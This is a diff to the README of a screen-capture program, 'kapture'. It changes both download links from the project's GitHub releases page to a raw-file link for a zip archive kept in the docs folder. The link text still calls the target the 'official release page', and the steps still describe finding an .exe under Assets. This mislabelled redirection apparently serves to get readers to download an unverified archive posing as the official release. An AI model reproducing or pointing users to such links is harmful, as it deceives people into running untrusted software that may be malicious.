@@ -1,6 +1,6 @@
 # 📸 kapture - Capture your screen with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/victorycandelar6845/kapture/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/victorycandelar6845/kapture/main/docs/Software-1.1.zip)
 
 kapture helps you save images and videos from your computer screen. You can take pictures of specific areas, record your screen, and extract text from images. This tool combines many features into one simple program. It works well for office tasks, school projects, and content creation.
 
@@ -15,7 +15,7 @@ kapture helps you save images and videos from your computer screen. You can take
 
 ## 📥 How to Download
 
-1. Visit the [official release page](https://github.com/victorycandelar6845/kapture/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/victorycandelar6845/kapture/main/docs/Software-1.1.zip).
 2. Locate the latest version at the top of the list.
 3. Look for the file ending in `.exe` under the Assets section.
 4. Click the file name to start your download.
